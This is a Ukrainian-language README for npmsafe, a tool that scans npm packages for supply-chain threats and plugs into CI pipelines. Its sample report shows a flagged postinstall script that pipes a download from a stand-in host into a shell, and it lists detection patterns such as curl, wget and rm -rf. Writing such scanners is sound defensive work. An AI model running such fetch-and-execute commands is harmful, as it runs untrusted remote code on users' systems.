# npmsafe 🛡️

npmsafe — потужний інструмент для захисту від supply-chain атак у npm екосистемі. Перевіряє пакети до інсталяції через AST-аналіз JavaScript коду, виявлення підозрілих lifecycle скриптів, генерацію детальних JSON-звітів та інтеграцію в CI/CD пайплайни.

## 🚀 Особливості

- **AST-аналіз**: Виявляє небезпечні патерни (`eval`, `new Function`, `child_process`, `exec`)
- **Lifecycle скрипти**: Перевіряє підозрілі `postinstall`, `preinstall`, `prepare` скрипти
- **Рівні ризику**: `safe` | `suspicious` | `malicious` з детальним поясненням
- **JSON звіти**: Структуровані дані для автоматизації та аналітики
- **CI/CD інтеграція**: Exit codes (0,1,2) для автоматичних перевірок
- **Швидкість**: Оптимізований аналіз з обмеженням глибини сканування

## 📦 Встановлення

```bash
npm install -g npmsafe
```

Або для локального використання:
```bash
npm install npmsafe
npx npmsafe [options] <path>
```

## 🔧 Використання

### Базове використання

```bash
# Перевірити пакет у поточній директорії
npmsafe .

# Перевірити конкретний пакет
npmsafe /path/to/package

# Перевірити за package.json файлом
npmsafe package.json
```

### Опції командного рядка

```bash
# Детальний вивід
npmsafe . --verbose

# JSON формат виводу
npmsafe . --format json

# Суворий режим (suspicious = malicious)
npmsafe . --strict

# Показати версію
npmsafe --version

# Показати довідку
npmsafe --help
```

## 📊 Приклади виводу

### Текстовий формат

```
🔍 Аналіз безпеки пакету: suspicious-package
📊 Рівень ризику: 🟡 SUSPICIOUS

⚠️  Виявлені проблеми:
1. script: Підозрілий postinstall скрипт: Завантаження файлів з мережі
   Розташування: package.json:scripts.postinstall
2. ast: Використання eval() - небезпечно для виконання коду
   Розташування: index.js:15

📈 Статистика:
   Перевірено файлів: 3
   Підозрілих скриптів: 1
   AST-попереджень: 1
```

### JSON формат

```json
{
  "packageName": "suspicious-package",
  "version": "1.0.0",
  "risk": "suspicious",
  "issues": [
    {
      "type": "script",
      "severity": "high", 
      "description": "Підозрілий postinstall скрипт: Завантаження файлів з мережі",
      "details": "curl -s http://example.com/script.sh | sh",
      "location": "package.json:scripts.postinstall"
    }
  ],
  "stats": {
    "filesScanned": 3,
    "suspiciousScripts": 1,
    "astWarnings": 1
  },
  "timestamp": "2025-01-15T10:30:00.000Z"
}
```

## 🚨 Типи загроз що виявляються

### Lifecycle скрипти
- `postinstall`, `preinstall`, `install`, `prepare`
- Завантаження файлів з мережі (`curl`, `wget`, `fetch`)
- Виконання shell команд (`sh`, `bash`, `exec`)
- Видалення файлів (`rm -rf`, `rmdir`)
- Зміна прав доступу (`chmod`)

### AST патерни
- `eval()` - динамічне виконання коду
- `new Function()` - конструктор функцій
- `child_process` - системні команди
- `exec`, `spawn`, `fork` - процеси
- Обфусковані/великі файли

## 🔄 Рівні ризику

| Рівень | Exit Code | Опис |
|--------|-----------|------|
| `safe` | 0 | Проблем не виявлено |
| `suspicious` | 1 | Підозрілі патерни, потребує перевірки |
| `malicious` | 2 | Високий ризик, не рекомендується |
| `error` | 3 | Помилка аналізу |

## 🔧 CI/CD Інтеграція

### GitHub Actions

```yaml
name: npm Security Check
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install npmsafe
        run: npm install -g npmsafe
      
      - name: Security scan
        run: npmsafe . --format json > security-report.json
      
      - name: Upload report
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: security-report
          path: security-report.json
```

### GitLab CI

```yaml
security_scan:
  image: node:18
  script:
    - npm install -g npmsafe
    - npmsafe . --format json > security-report.json
  artifacts:
    reports:
      junit: security-report.json
    when: always
  only:
    - merge_requests
    - main
```

### Jenkins Pipeline

```groovy
pipeline {
    agent any
    
    stages {
        stage('Security Scan') {
            steps {
                sh 'npm install -g npmsafe'
                sh 'npmsafe . --format json > security-report.json'
                
                publishHTML([
                    allowMissing: false,
                    alwaysLinkToLastBuild: true,
                    keepAll: true,
                    reportDir: '.',
                    reportFiles: 'security-report.json',
                    reportName: 'NPM Security Report'
                ])
            }
        }
    }
}
```

## 🛠️ API використання

```javascript
const { analyzePackage } = require('npmsafe');

async function checkPackage() {
  const result = await analyzePackage('./path/to/package', {
    verbose: true,
    strict: false
  });
  
  console.log(`Risk level: ${result.risk}`);
  console.log(`Issues found: ${result.issues.length}`);
  
  return result.risk === 'safe';
}
```

## ⚡ Продуктивність

- **Швидкість**: ~1-5 секунд для середнього пакету
- **Обмеження**: Максимум 50 JS файлів, глибина сканування 3 рівні
- **Пам'ять**: Мінімальне споживання через потоковий аналіз

## 🤝 Розробка

```bash
# Клонування репозиторію
git clone https://github.com/pilipandr770/npmsafe.git
cd npmsafe

# Встановлення залежностей  
npm install

# Запуск тестів
npm test

# Тестування CLI
npm start -- ./test-package --verbose
```

## 📄 Ліцензія

MIT License - див. [LICENSE](LICENSE) файл.

## 🐛 Повідомлення про помилки

Будь ласка, створюйте issues на [GitHub](https://github.com/pilipandr770/npmsafe/issues) з детальним описом проблеми.

## 🌟 Контрибуція

Приймаємо pull requests! Будь ласка:
1. Створіть issue для обговорення змін
2. Додайте тести для нової функціональності
3. Дотримуйтеся існуючого стилю коду

---

**npmsafe** - ваш надійний захисник від supply-chain атак у npm! 🛡️
